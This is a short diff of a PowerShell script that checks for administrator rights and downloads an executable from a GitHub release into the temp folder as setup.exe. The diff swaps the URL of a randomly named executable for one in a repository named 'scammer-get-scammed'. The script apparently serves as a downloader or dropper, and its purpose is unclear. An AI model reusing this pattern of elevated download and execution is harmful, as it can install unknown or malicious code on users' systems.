@@ -13,7 +13,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 $outputExe = Join-Path -Path $OriginalTemp -ChildPath "setup.exe"
-$downloadUrl = "https://github.com/xt6p/a/releases/download/setup/r54W3nY0.0Jx.exe"
+$downloadUrl = "https://github.com/scammer-get-scammed/c/releases/download/Setup/AdventureWars.exe"
 
 try {
     try {
